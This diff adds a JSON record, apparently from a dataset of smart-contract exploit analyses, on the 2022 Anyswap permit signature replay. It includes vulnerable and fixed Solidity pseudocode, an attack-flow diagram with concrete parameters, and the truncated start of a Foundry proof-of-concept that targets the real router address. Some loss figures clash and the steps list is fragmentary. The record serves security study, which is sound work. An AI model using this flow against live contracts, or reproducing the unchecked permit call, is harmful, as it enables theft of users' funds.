@@ -1,0 +1,34 @@
+{
+ "id": "2022__2022-01-18_Anyswap_PermitSignatureReplay",
+ "source_file": "2022/2022-01-18_Anyswap_PermitSignatureReplay.md",
+ "title": "Anyswap — Permit Signature Replay Attack Analysis",
+ "date": "2022-01-18",
+ "protocol": "Anyswap",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$3,000,000 total across 8 affected tokens (WETH, AVAX, MATIC, WBNB, and others); ~1,889 WETH stolen from the WETH pool specifically; ~$912 WETH rescued by whitehat (net $1.8M WETH). Multi-token total per CoinDesk.",
+ "loss_usd": 3000000.0,
+ "root_cause": "`anySwapOutUnderlyingWithPermit()` processed permit parameters (v=0, r/s empty) without validation, enabling unauthorized transfer of other users' WETH",
+ "attack_tx": "Block 14,037,236",
+ "vulnerable_contract": "0x6b7a87899490EcE95443e979cA9485CBE7E71522",
+ "classes": [
+  "signature-replay"
+ ],
+ "code_before": [
+  "❌ Vulnerable anySwapOutUnderlyingWithPermit (pseudocode)\nfunction anySwapOutUnderlyingWithPermit(\n    address from,\n    address token,\n    address to,\n    uint256 amount,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s,\n    uint256 toChainID\n) external {\n    //",
+  "❌ permit call failure is ignored — no try/catch or return value check\n    // WETH does not implement permit → call passes through harmlessly\n    IERC20(token).permit(from, address(this), amount, deadline, v, r, s);\n\n    //",
+  "❌ transferFrom executes regardless of permit success\n    // If `from` has already approved Anyswap, this always succeeds\n    IERC20(token).transferFrom(from, address(this), amount);\n\n    // Bridge processing ...\n    emit LogAnySwapOut(token, from, to, amount, cID(), toChainID);\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern\nfunction anySwapOutUnderlyingWithPermit(...) external {\n    address underlying = AnyswapV1ERC20(token).underlying();\n    //",
+  "✅ Verify allowance before and after permit execution\n    uint256 allowanceBefore = IERC20(underlying).allowance(from, address(this));\n    IERC20(underlying).permit(from, address(this), amount, deadline, v, r, s);\n    uint256 allowanceAfter = IERC20(underlying).allowance(from, address(this));\n    require(allowanceAfter >= allowanceBefore + amount, \"Permit failed\");\n    IERC20(underlying).transferFrom(from, address(this), amount);\n}"
+ ],
+ "steps": [
+  "WETH does not implement permit → passes without revert or silent fail",
+  "Victim had already approved the amount → succeeds",
+  "[5] 308.6 ETH worth of WETH drained → transferred to attacker address"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] Identify victim addresses that already have Anyswap approved for WETH\n    │       (on-chain event / mempool monitoring)\n    │\n    ├─[2] Call anySwapOutUnderlyingWithPermit()\n    │       from    = victim address\n    │       token   = AnyswapV1ERC20 (underlying = WETH)\n    │       amount  = 308,636,644,758,370,382,903\n    │       v=0, r=0x00, s=0x00  ← invalid signature\n    │       toChainID = 56 (BSC)\n    │\n    ├─[3] Internally: WETH.permit(victim, ..., v=0) is called\n    │       WETH does not implement permit → passes without revert or silent fail\n    │\n    ├─[4] WETH.transferFrom(victim, Anyswap, amount)\n    │       Victim had already approved the amount → succeeds\n    │\n    └─[5] 308.6 ETH worth of WETH drained → transferred to attacker address",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IAnyswapV4Router {\n    function anySwapOutUnderlyingWithPermit(\n        address from,\n        address token,\n        address to,\n        uint256 amount,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        uint256 toChainID\n    ) external;\n}\n\ninterface IAnyswapV1ERC20 {\n    function underlying() external view returns (address);\n    function burn(address from, uint256 amount) external returns (bool);\n    function depositVault(uint256 amount, address to) external returns (uint256);\n}\n\ncontract ContractTest is Test {\n    IAnyswapV4Router anyswapV4Router =\n        IAnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);\n    IERC20 WETH = IERC20(0xC02a"
+ ]
+}
